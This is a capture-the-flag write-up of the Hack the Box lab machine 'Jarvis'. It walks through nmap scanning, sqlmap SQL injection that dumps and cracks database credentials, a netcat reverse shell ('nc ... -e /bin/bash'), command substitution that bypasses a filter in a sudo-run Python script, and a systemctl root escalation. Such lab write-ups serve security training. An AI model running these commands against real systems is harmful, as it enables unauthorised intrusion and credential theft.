+++
author = "Nick"
categories = ["CTF", "enumeration", "Linux", "metasploit", "netcat", "python", "reverse shell", "web services", "SQL Injection"]
date = 2019-11-09T16:06:00Z
description = ""
draft = false
thumbnail = "/images/2019/08/info-2.png"
slug = "hack-the-box-jarvis"
summary = "Today we're going to do the machine Jarvis on Hack the Box. This box was a total pain in the ass due to the way my reverse shell was terminating lines. After I figured out that was the problem it was easier. Lets jump in!"
tags = ["CTF", "enumeration", "Linux", "metasploit", "netcat", "python", "reverse shell", "web services", "SQL Injection"]
title = "Hack the Box - Jarvis"
url = "/hack-the-box-jarvis"

+++


Today we're going to do the machine Jarvis on Hack the Box. This box was a total pain in the ass due to the way my reverse shell was terminating lines. After I figured out that was the problem it was easier. Lets jump in!

The first things we do is our standard nmap command ```nmap -sC -sV -oA jarvis 10.10.10.143``` We get back a small result

```
Nmap scan report for 10.10.10.143
Host is up (0.058s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So the first thing we do is to head over to the http port and see what's being hosted. We see a hotel site. Many of the links are dead, but the rooms are not. So lets look at them. The first thing we notice is that the rooms page sends us to rooms-suites.php. There's a good chance that we can exploit some PHP. When we click on room 1 and wee it references ?cod=1

![](/images/2019/08/image-23.png" caption="This might be injectable.&nbsp;)

We can run some manual SQL injections against it to test. Turns out it is injectable. We actually get banned for 90 seconds by issuing '1=1'"--. So lets run some sqlmap against it. We run ```sqlmap -u http://10.10.10.143/room.php?cod=1 --dbs --no-cast``` We have to use --no-cast to convert our null values becuase the service running will likley ban us due to injection attempts.

![](/images/2019/08/image-10.png" caption="sqlmap -u http://10.10.10.143/room.php?cod=1 --dbs --no-cast)

Now that we've run our mapping successfully, we get back a list of databases. We will check the tables of the 'mysql' database by issuing ```sqlmap -u http://10.10.10.143/room.php?cod=1 -D mysql --tables```.

![](/images/2019/08/image-11.png)

Now that we've dumped the mysql table, lets dump the user portion of it. We issue ```sqlmap -u http://10.10.10.143/room.php?cod=1 -D mysql -T user --dump``` The -D is for Database, the -T is for Table and well we know what --dump does.

Once we've dumped the table we have a user of DBAdmin. SQLMAP will offer to crack the password for us, so why not.

![](/images/2019/08/image-12.png" caption="The cracked password for the phpmyadmin DBAdmin account.)

We know that there is a phpmyadmin console running from enumerating the web service with dirbuster and the default word list.

Next we'll use SQLMAP --shell functionality to see if we can create a reverse shell. We'll issue ```sqlmap -u http://10.10.10.143/room.php?cod=6 -D hotel --os-shell --no-cast```.

![](/images/2019/08/image-13.png)

It worked, we  get a shell as www-admin. So we'll poke around the box. We see that there is a user called Pepper, but we can't access the user.txt file. We try to do some manual enumeration and see that there is a file we can run, simpler.py.

![](/images/2019/08/image-14.png)

When we run the python app as us, we can't. We can however run it as pepper. When we do we're greeted with a command screen:

![](/images/2019/08/image-24.png)

The script seems to give us some info on who would be considered an attacker. Lets look at the source of the script. When we do we see this function, exec_ping() that correlates to the -p command of the script.

![](/images/2019/08/image-15.png)

Now this is where I was having issues with the program. No matter how many times I attempted to run the program, i would get EOF errors:

![](/images/2019/08/image-25.png" caption="EOF Error?!)

So turns out that the shell I was getting from SQLMAP was sending some odd terminal characters in the blank space?! So, I created a quick MSFPayload with MSFPC for a php reverse shell and everything was easy from there out!

This is a text book command injection, with a twist. We have some forbidden characters. So normally, we would be able to issue something like ```simpler.py -p 1 & {MALICIOUS COMMAND}```. This would tell the os to ping an ip of 1 and then execute our malicous command. However, since & is forbidden as well as most standard concatination commands we'll need to be a little bit more creative. We can use [command substitution](https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html) since the $ is not forbidden.

The first thing we'll do is a create a small script to initiate a netcat connection back to us.

```bash
echo 'nc 10.10.15.197 4444 -e /bin/bash' > remote.sh
```

We'll then use Command Substitution within the python program to call thsi script. So in the end we have something like this:

```bash
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
Enter an IP: $(/bin/bash remote.sh)
```
So we'll initiate a netcat session: ```nc -lvnp 4444```

After we run it, we see our netcat session light up!

![](/images/2019/08/image-18.png" caption="We've obtained user!)

Now that we're logged in as pepper, lets snag our user key and move onto root!

The shells on the free box have been quite flakey so to hopefully mitigate this, I generated a new id_rsa.pub file and copied it to the box for easy ssh access. Alternatively you can echo your key to the file if it already exists.

![](/images/2019/08/image-19.png)

Now that I can ssh into the box, we download LinEnum.sh to the machine and see what pops up.

![](/images/2019/08/image-20.png)

While parsing through the LinEnum outputs, we see this line:

![](/images/2019/08/image-21.png)

Pepper has the ability to run systemctl. That's quite handy. So we do some googling around and find this: [https://gtfobins.github.io/gtfobins/systemctl/](https://gtfobins.github.io/gtfobins/systemctl/). This will allow us to bypass the requirements for creating a Unit. So we can create a reverse shell task as root and hopefully obtain our flag!

![](/images/2019/08/image-26.png" caption="We follow the steps that are given to us by gtfobins and...)

We have root!

![](/images/2019/08/image-22.png)

Another one bites the dust! We'll see you next time!

Hopefully something was learned. If you found this write-up helpful, consider sending some respect my way: [Lovecore's HTB Profile](https://www.hackthebox.eu/home/users/profile/95635).

